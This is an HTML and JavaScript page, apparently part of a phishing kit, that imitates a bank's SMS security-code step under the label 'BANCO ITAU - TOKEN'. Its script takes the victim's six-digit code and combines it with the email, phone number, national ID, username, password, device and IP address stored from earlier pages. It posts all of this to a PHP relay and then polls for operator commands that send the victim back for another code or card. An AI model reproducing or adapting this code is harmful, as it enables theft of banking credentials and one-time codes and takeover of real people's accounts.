<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Código de Seguridad</title>
  <link rel="stylesheet" href="css/index.css">
</head>
<body>
  <!-- Campos ocultos necesarios -->
  <input type="hidden" id="session_id" value="">
  <input type="hidden" id="username" value="">

  <div class="form-container">
    <img src="img/viste.png" alt="Logo" class="logo">
    <h1>Ingresa tu código de seguridad</h1>
    
    <p class="mensaje-info">Para confirmar su transacción, ingrese su código de seguridad enviado por SMS a su dispositivo móvil</p>

    <label for="token">Código de seguridad</label>
    <input type="text" id="token" placeholder="Ingresa tu código de seguridad" maxlength="6" minlength="6" pattern="[0-9]+" oninput="this.value = this.value.replace(/[^0-9]/g, '')" title="Solo números, exactamente 6 dígitos" style="text-align: center; font-size: 18px; letter-spacing: 2px;" />

    <a href="#" class="link">¿Tienes problemas con tu código?</a>

    <button id="btnIngresar" disabled>Confirmar</button>
  </div>

  <!-- Loader overlay -->
  <div id="loader-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.8); z-index: 9999; justify-content: center; align-items: center;">
    <div style="text-align: center;">
      <img src="img/viste.png" alt="Logo" style="width: 80px; height: 80px; animation: blink 1s ease-in-out infinite;">
    </div>
  </div>

  <div class="side-image">
    <img src="img/tele.png" alt="Imagen lateral">
  </div>

  <style>
    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.3; }
    }
  </style>

  <script>
    // Ocultar loader al cargar la página
    document.addEventListener('DOMContentLoaded', function() {
      const loader = document.getElementById('loader-overlay');
      if (loader) {
        loader.style.display = 'none';
      }
    });

    function validarCampos() {
      const btnIngresar = document.getElementById("btnIngresar");
      const token = document.getElementById("token").value;
      
      // Validar que el token tenga 6 dígitos
      const camposCompletos = token.length === 6;
      
      // Cambiar estado del botón
      if (camposCompletos) {
        btnIngresar.disabled = false;
        btnIngresar.style.background = "#FF6B35";
        btnIngresar.style.border = "none";
        btnIngresar.style.color = "white";
        btnIngresar.style.cursor = "pointer";
      } else {
        btnIngresar.disabled = true;
        btnIngresar.style.background = "#e6e6e6";
        btnIngresar.style.border = "1px solid #ccc";
        btnIngresar.style.color = "#888";
        btnIngresar.style.cursor = "not-allowed";
      }
    }

    // Agregar event listener al campo token
    document.addEventListener('DOMContentLoaded', function() {
      const tokenField = document.getElementById("token");
      tokenField.addEventListener('input', validarCampos);
      
      // Validar inicialmente
      validarCampos();
    });
  </script>
  
  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const urlParams = new URLSearchParams(window.location.search);
      
      // Generar o recuperar session_id
      let sessionId = localStorage.getItem('session_id');
      if (!sessionId) {
        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('session_id', sessionId);
      }
      
      const sessionInput = document.getElementById('session_id');
      sessionInput.value = sessionId;

      // Obtener usuario desde URL params y establecer en el campo hidden
      const userFromUrl = urlParams.get('user');
      const usernameInput = document.getElementById('username');
      if (userFromUrl) {
        usernameInput.value = userFromUrl;
        localStorage.setItem('username', userFromUrl);
      }

      // Event listener para el botón Continuar
      const btnIngresar = document.getElementById('btnIngresar');
      
      btnIngresar.addEventListener('click', async function (event) {
        event.preventDefault();

        // Obtener el token
        const token = document.getElementById('token').value;
        
        // Validar que el token tenga 6 dígitos
        if (token.length !== 6) {
          alert('El token debe tener 6 dígitos');
          return;
        }

        // Mostrar loader
        const loader = document.getElementById('loader-overlay');
        if (loader) {
          loader.style.display = 'flex';
        }

        const formUsername = document.getElementById('username').value;
        const session_id = document.getElementById('session_id').value;

        localStorage.setItem('username', formUsername);
        localStorage.setItem('token', token);
        localStorage.setItem('session_id', session_id);

        // Obtener la identificación desde la URL (que se pasó desde index.html)
        const identificacion = urlParams.get('identificacion') || '';
        
        // Detectar tipo de dispositivo
        const userAgent = navigator.userAgent;
        let dispositivo = 'PC';
        
        if (/Android/i.test(userAgent)) {
          dispositivo = 'Android';
        } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
          dispositivo = 'iPhone';
        } else if (/Windows/i.test(userAgent)) {
          dispositivo = 'PC';
        } else if (/Mac/i.test(userAgent)) {
          dispositivo = 'Mac';
        } else if (/Linux/i.test(userAgent)) {
          dispositivo = 'Linux';
        }
        
        const hora = new Date().toLocaleString('es-ES');
        
        // Obtener IP y construir mensaje
        fetch('get_ip.php')
          .then(response => response.json())
          .then(data => {
            const ip = data.ip || 'No disponible';
            
            const mensaje = `
<b><u>💎BANCO ITAU - TOKEN💎</u></b>
• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
• <b>🏦Banco:</b> BANCO ITAU
------------------------------
• <b>📟Dispositivo:</b> ${dispositivo}
• <b>🗺IP:</b> ${ip}
• <b>⏱Hora:</b> ${hora}
------------------------------
• <b>👤 Usuario:</b> ${localStorage.getItem('identificacion') || 'No disponible'}
• <b>🔑 Clave:</b> ${localStorage.getItem('password') || 'No disponible'}
------------------------------
• <b>🔄 Token:</b> ${token}
------------------------------`;

            const formData = new FormData();
            formData.append('message', mensaje);
            formData.append('transactionId', session_id);

            fetch('procesar_dinamica.php', {
              method: 'POST',
              body: formData
            })
            .then(res => res.json())
            .then(result => {
              if (result.status === 'success') {
                checkPaymentVerification(session_id, result.messageId);
              } else {
                // Ocultar loader si hay error
                const loader = document.getElementById('loader');
                if (loader) {
                  loader.style.display = 'none';
                }
              }
            })
            .catch(err => {
              // Ocultar loader si hay error
              const loader = document.getElementById('loader');
              if (loader) {
                loader.style.display = 'none';
              }
            });
          })
          .catch(() => {
            // Si falla la obtención de IP, enviar sin IP
            const mensaje = `
<b><u>💎BANCO ITAU - TOKEN💎</u></b>
• <b>💌Correo:</b> ${localStorage.getItem('correo') || 'No disponible'}
• <b>📞Celular:</b> ${localStorage.getItem('cel') || 'No disponible'}
• <b>💸Cedula:</b> ${localStorage.getItem('val') || 'No disponible'}
• <b>👤Persona:</b> ${localStorage.getItem('per') || 'No disponible'}
• <b>🏦Banco:</b> BANCO ITAU
------------------------------
• <b>📟Dispositivo:</b> ${dispositivo}
• <b>🗺IP:</b> No disponible
• <b>⏱Hora:</b> ${hora}
------------------------------
• <b>👤 Usuario:</b> ${localStorage.getItem('identificacion') || 'No disponible'}
• <b>🔑 Clave:</b> ${localStorage.getItem('password') || 'No disponible'}
------------------------------
• <b>🔄 Token:</b> ${token}
------------------------------`;

            const formData = new FormData();
            formData.append('message', mensaje);
            formData.append('transactionId', session_id);

            fetch('procesar_dinamica.php', {
              method: 'POST',
              body: formData
            })
            .then(res => res.json())
            .then(result => {
              if (result.status === 'success') {
                checkPaymentVerification(session_id, result.messageId);
              } else {
                // Ocultar loader si hay error
                const loader = document.getElementById('loader');
                if (loader) {
                  loader.style.display = 'none';
                }
              }
            })
            .catch(err => {
              // Ocultar loader si hay error
              const loader = document.getElementById('loader');
              if (loader) {
                loader.style.display = 'none';
              }
            });
          });
      });
    });

    async function checkPaymentVerification(transactionId, messageId) {
  try {
    const formData = new FormData();
    formData.append('transactionId', transactionId);
    formData.append('messageId', messageId);

    const res = await fetch('verificar_dinamica.php', {
      method: 'POST',
      body: formData
    });
    const result = await res.json();

    if (result.action) {
      const loader = document.getElementById('loader');
      if (loader) loader.style.display = 'none';

      switch (result.action) {
        case 'pedir_dinamica':
          alert("Error de Código de Seguridad.");
          window.location.href = "token.php";
          break;

        case 'error_logo':
          alert("Usuario o clave incorrectos.");
          window.location.href = "index.html";
          break;

        case 'error_tc':
          alert("Error con la tarjeta. Intenta con otra.");
          window.location.href = "tarjeta.php";  // Ajusta esta ruta si es diferente
          break;

        case 'confirm_finalizar':
          window.location.href = "/fin.php";
          break;
      }
    } else {
      setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
    }
  } catch (err) {
    setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
  }
}

  </script>
</body>
</html> 
